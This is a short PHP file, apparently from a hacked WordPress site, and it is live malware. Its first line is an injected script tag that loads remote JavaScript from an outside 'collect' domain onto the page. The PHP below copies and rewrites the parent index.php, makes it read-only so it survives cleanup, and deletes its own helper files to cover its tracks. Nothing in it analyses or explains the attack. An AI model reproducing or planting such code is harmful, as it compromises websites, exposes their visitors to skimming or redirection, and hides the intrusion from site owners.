<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php

	$out = fopen("wp-admin-temp", "w");
	fwrite($out, "...");
	fclose($out);

 $file = fopen("../index.php", "r"); 
 $buffer = fread($file, filesize("../index.php")); 

						  $outheader = fopen("z", "w");
						  fwrite($outheader, $buffer);
						  fclose($outheader);

sleep(10);

 $file = fopen("z", "r"); 
 $code = fread($file, filesize("z")); 

$ddir = "../";
                          chmod($ddir."index.php", 0644);
						  $outheader = fopen($ddir."index.php", "w");
						  fwrite($outheader, $code);
						  fclose($outheader);
						  chmod($ddir."index.php", 0444);
						  

@unlink("index.php");
@unlink("wp-admin-temp");
@unlink("z");
@unlink("../wp-index");
?>